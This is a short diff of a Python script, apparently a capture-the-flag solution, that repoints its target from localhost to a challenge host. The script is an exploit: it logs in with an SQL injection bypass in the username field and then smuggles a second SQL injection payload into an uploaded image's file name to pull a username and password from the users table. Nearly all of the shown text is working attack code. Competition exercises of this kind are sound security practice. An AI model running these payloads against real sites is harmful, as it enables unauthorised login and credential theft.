@@ -5,7 +5,7 @@ print()
 s = session()
 
 # Login to the galery
-url = "http://localhost:5000/login"
+url = "http://fantasybook.ec2qualifications.esaip-cyber.com/login"
 data = {
     "username": "' OR 1=1 -- -",
     "password": "x"
@@ -15,7 +15,7 @@ print("\033[32;1m[+] Login successfully\033[0m")
 
 # SQLi on file upload
 payload = "'||(SELECT username||'~'||password FROM users LIMIT 1)||'"
-url = "http://localhost:5000/galery"
+url = "http://fantasybook.ec2qualifications.esaip-cyber.com/gallery"
 file = {
     "image": (payload, b"random", "image/png")
 }
